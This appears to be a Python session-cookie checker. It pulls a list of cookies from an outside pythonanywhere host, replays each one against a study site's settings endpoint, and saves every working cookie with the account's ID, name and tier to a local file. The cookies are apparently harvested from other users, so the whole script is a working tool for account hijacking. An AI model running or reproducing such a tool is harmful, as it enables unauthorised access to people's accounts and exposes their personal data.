import requests
import time

saved_file_path = 'accounts.txt'
list =[]
open(saved_file_path, 'a')
with open(saved_file_path, 'r') as f:
    cont = f.read()

def save(id, cookie):
    form = f"{id}|{cookie}\n"
    open(saved_file_path, 'a').write(form)
    return True

for item in cont.splitlines():
    try:
      id, cookie = item.split("|")
      list.append(id)
    except Exception as e:
       print("\033[1;31m[ERROR] -\033[0m", str(e), item)
       list.append(item.split("|")[0])

def linex():
   print("\033[1;30m------------------------------------------------\033[0m")

sr = requests.get('http://nbprg.pythonanywhere.com/show').text.splitlines()
sr = sr[::-1]
print("\033[0mLen :\033[1;32m", str(len(sr)))
print("\033[0mSep :\033[1;32m", str(len(list)))
linex()

for i in sr:
    try:
        data = requests.get('https://mujib.chorcha.net/settings', cookies={'cookie': i}).json()
        dx = data['data']['user']
        id = dx['_id']
        if not id in list:
            list.append(id)
            save(id, cookie=i)
            print(f"[\033[1;32mOK\033[0m] -\033[32m {id} - {dx['name']} - {dx['tier']}\033[0m")
            linex()
            print('Cookie : \033[1;32m'+i+'\033[0m')
            linex()
    except Exception as e:
       print("\033[1;31m[ERROR] -\033[0m", str(e), data, i)

